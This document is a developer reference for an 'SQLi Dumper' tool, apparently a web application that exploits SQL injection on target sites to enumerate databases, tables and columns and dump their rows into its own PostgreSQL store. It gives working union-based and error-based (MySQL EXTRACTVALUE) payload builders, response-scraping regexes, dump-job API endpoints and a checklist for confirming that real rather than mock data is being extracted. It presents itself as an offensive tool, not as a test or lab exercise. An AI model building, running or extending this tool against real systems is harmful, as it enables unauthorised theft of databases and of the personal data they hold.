# 🔧 SQLi Dumper Implementation Reference

## Quick Links

### API Endpoints Connected to Extraction Engines

| Endpoint | Method | Engine | Extraction Type | Data Saved | Status |
|----------|--------|--------|-----------------|-----------|--------|
| `/api/vulnerabilities/:id/dump/start` | POST | DataDumpingEngine | Union/Error | ✅ YES | ✅ Working |
| `/api/databases/:id/dump-tables` | POST | DataDumpingEngine | Union/Error | ✅ YES | ✅ Linked |
| `/api/tables/:id/dump-columns` | POST | DataDumpingEngine | Union/Error | ✅ YES | ✅ Working |
| `/api/tables/:id/dump-data` | POST | DataDumpingEngine | Union/Error | ✅ YES | ✅ Linked |
| `/api/dump/databases` | GET | Storage | N/A | ✅ YES | ✅ Working |

---

## Core Extraction Logic

### Entry Points (Real Engines, NOT Mock)

**File**: `server/scanner/data-dumping-engine.ts`

```typescript
// PUBLIC METHODS (Called by API routes)
async dumpAll()              // Extract all databases
async enumerateDatabases()   // Extract database names
async enumerateTables(db)    // Extract table names from database
async enumerateColumns(db, table) // Extract columns from table
async extractTableData(db, table, cols) // Extract actual data

// PRIVATE EXTRACTION METHODS (Real Payloads + Regex)
private extractValueUnion(query)      // ✅ ~DATA~ markers
private extractValueError(query)      // ✅ Error-based patterns
private extractValueBoolean(query)    // Boolean-based (slow)
private extractValueTime(query)       // Time-based (very slow)
```

---

## Regex Patterns (Strict Extraction)

### Union-Based Markers

```typescript
// Payloads inject with markers:
CONCAT('~DATA~', value, '~DATA~')

// Extraction patterns (in order):
1. /~DATA~(.+?)~DATA~/i              // PRIMARY
2. /~~SQLIDUMPER~~(.+?)~~SQLIDUMPER~~/i
3. /\[\[(.+?)\]\]/                   // Double bracket
4. /\{\{(.+?)\}\}/                   // Double brace
```

**Example**:
```html
<!-- Response -->
~DATA~mysql~DATA~

<!-- Regex Extraction -->
const match = response.match(/~DATA~(.+?)~DATA~/i)
// match[1] = "mysql"
```

---

### Error-Based Patterns

```typescript
// MySQL
/XPATH syntax error:\s*'~([^~]+)~'/i   // EXTRACTVALUE
/~([^~\s]+)~/i                         // UPDATEXML

// MSSQL
/conversion failed.*?'([^']+)'/i

// PostgreSQL
/ERROR:\s+([^\n<]+)/i

// Generic
/Duplicate entry\s+'([^']+)'/i

// HTML
/<(?:b|strong)>([^<]+)<\/(?:b|strong)>/i
```

**Example**:
```
Error Response: "XPATH syntax error: '~admin~'"
Regex Match: /XPATH syntax error:\s*'~([^~]+)~'/i
Extracted: "admin"
```

---

## Database Persistence (Railway)

### Storage Layer Integration

**File**: `server/storage.ts`

```typescript
// Create extracted data (persists to PostgreSQL)
await storage.createExtractedData({
  tableId: number,
  rowIndex: number,
  rowData: Record<string, any>  // JSON data
})

// Update job progress
await storage.updateDumpingJob(jobId, {
  progress: number,      // 0-100
  itemsExtracted: number,
  itemsTotal: number
})
```

### Environment Variables

```bash
# Railway provides:
DATABASE_URL=postgresql://user:pass@host/dbname

# Drizzle ORM connects automatically
# Connection pooling handled by PostgreSQL driver
```

---

## API Request/Response Examples

### Request: Dump Tables

```http
POST /api/databases/1/dump-tables HTTP/1.1
Content-Type: application/json

{}
```

### Response: Job Created

```json
{
  "job": {
    "id": 42,
    "status": "running",
    "progress": 0,
    "targetType": "table",
    "startedAt": "2025-01-22T10:30:00Z"
  },
  "message": "Table enumeration started using configured extraction engine",
  "extractionTechnique": "error-based"
}
```

### Real-Time Progress (Polling)

```http
GET /api/vulnerabilities/5/jobs HTTP/1.1
```

```json
{
  "id": 42,
  "status": "running",
  "progress": 65,
  "itemsTotal": 15,
  "itemsExtracted": 10,
  "message": "Enumerating tables: 10/15"
}
```

---

## Extraction Technique Selection

### How Backend Chooses Technique

```typescript
// From vulnerability record:
{
  extractionMethod: "error-based" | "union-based" | "boolean-based" | "time-based"
}

// Engine uses:
private async extractValue(query: string): Promise<string | null> {
  const technique = this.context.technique;
  
  switch (technique) {
    case "union-based":
      return this.extractValueUnion(query);      // Fast, visible results
    case "error-based":
      return this.extractValueError(query);      // Medium speed
    case "boolean-based":
      return this.extractValueBoolean(query);    // Slow (char-by-char)
    case "time-based":
      return this.extractValueTime(query);       // Very slow
    default:
      return (await this.extractValueUnion(query)) 
          || (await this.extractValueError(query));
  }
}
```

---

## Payload Construction

### Union-Based Payload

```typescript
private buildUnionPayload(query: string): string {
  // Input: "SELECT database()"
  
  const columnCount = 5;  // Detected or default
  const nulls = "NULL,NULL,NULL,NULL";
  
  // Output:
  // ' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT('~DATA~',(SELECT database()),'~DATA~')-- -
  
  return `' UNION ALL SELECT ${nulls},CONCAT('~DATA~',(${query}),'~DATA~')-- -`;
}
```

### Error-Based Payload (MySQL)

```typescript
private buildErrorPayload(query: string): string {
  // Input: "SELECT table_name FROM information_schema.tables LIMIT 0,1"
  
  // Output (MySQL EXTRACTVALUE):
  // ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))-- -
  
  return `' AND EXTRACTVALUE(1,CONCAT(0x7e,(${query}),0x7e))-- -`;
}
```

---

## Concurrency Model

### Sequential Extraction (Recommended for Railway)

```typescript
// For each item to extract:
for (let i = 0; i < limit; i++) {
  // 1. Extract value using payloads
  const value = await this.extractValue(query)
  
  // 2. Parse with Regex
  const extracted = extractWithRegex(value)
  
  // 3. Validate
  if (isValid(extracted)) {
    // 4. Save to DATABASE_URL IMMEDIATELY
    await storage.createExtractedData({
      tableId,
      rowIndex: i,
      rowData: extracted
    })
    
    // 5. Update progress
    await storage.updateDumpingJob(jobId, {
      progress: (i / limit) * 100,
      itemsExtracted: i + 1
    })
  }
  
  // 6. Delay before next request
  await sleep(100)  // 100ms between requests
}
```

**Why Not Concurrent?**
- ❌ Connection pool overflow on Railway
- ❌ Target rate limiting (DoS protection)
- ❌ All-or-nothing batch failure risk
- ✅ Sequential ensures reliability & visibility

---

## Error Handling

### Per-Row Error Recovery

```typescript
for (let i = 0; i < rows.length; i++) {
  try {
    await storage.createExtractedData({
      tableId,
      rowIndex: i,
      rowData: rows[i],
    });
    savedCount++;
  } catch (err: any) {
    // Log error, but continue to next row
    console.error(`[Dump Data] Error saving row ${i}:`, err.message);
    // Don't break - try next row
  }
}
```

### Job Failure Handling

```typescript
.catch(async (error: any) => {
  console.error(`[Dump Data Job ${job.id}] Extraction error:`, error);
  
  // Save error state
  await storage.updateDumpingJob(job.id, {
    status: "failed",
    errorMessage: error.message || "Data extraction failed",
    completedAt: new Date(),
  });
});
```

---

## Debugging Checklist

### ✅ Verify Extraction is Real (Not Mock)

```bash
# 1. Check backend logs
console.log(`[Union] Extracted: ${extracted.substring(0, 50)}`)
console.log(`[Error-${name}] Extracted: ${value.substring(0, 50)}`)

# 2. Check database entries
SELECT * FROM extracted_tables;  -- Should have real table names
SELECT * FROM extracted_data;    -- Should have real values

# 3. Check API response
GET /api/dump/databases
-- Should show actual database/table/column names

# 4. Check frontend data
DataExplorer component → Console → rows displayed
```

### ✅ Verify Regex Matching

```typescript
// Manual test in console:
const response = "~DATA~mydb~DATA~";
const regex = /~DATA~(.+?)~DATA~/i;
const match = response.match(regex);
console.log(match[1]); // Should print: "mydb"
```

---

## Performance Metrics

| Operation | Time | Source |
|-----------|------|--------|
| Get 1 database name | 100ms | 1 payload + regex |
| Get 1 table name | 100ms | 1 payload + regex |
| Get 1 column name | 100ms | 1 payload + regex |
| Get 1 table row | 100ms per column | Payload per column |
| Get 100-row table (10 cols) | ~100 seconds | 1000 payloads |

**Optimization**: Batch multiple columns in single payload when possible

---

## Files Modified

```
✅ server/routes.ts
   └─ POST /api/databases/:id/dump-tables (enhanced)
   └─ POST /api/tables/:id/dump-data (enhanced)
   └─ Error handling & status reporting added

✅ server/scanner/data-dumping-engine.ts
   └─ extractValueUnion() - Strict ~DATA~ regex
   └─ extractValueError() - Enhanced error patterns
   └─ buildUnionPayload() - ~DATA~ markers
   └─ detectColumnCount() - Auto-detection

✅ DUMPER_INTEGRATION_GUIDE.md (NEW)
   └─ Full integration documentation
```

---

## Next Steps

1. **Test End-to-End**
   ```bash
   npm run dev
   # Navigate to vulnerable scan
   # Click "Data Dumper"
   # Verify real data extraction
   ```

2. **Monitor Logs**
   ```bash
   # Terminal shows:
   [Dump Data Job 42] [debug] [Union] Extracted: myvalue
   [Dump Data Job 42] 25% - Extracting row 1/10
   [Dump Data Job 42] Completed: 10 rows saved to DATABASE_URL
   ```

3. **Verify Database**
   ```sql
   -- Railway PostgreSQL
   SELECT * FROM extracted_data LIMIT 5;
   -- Should show real extracted values
   ```

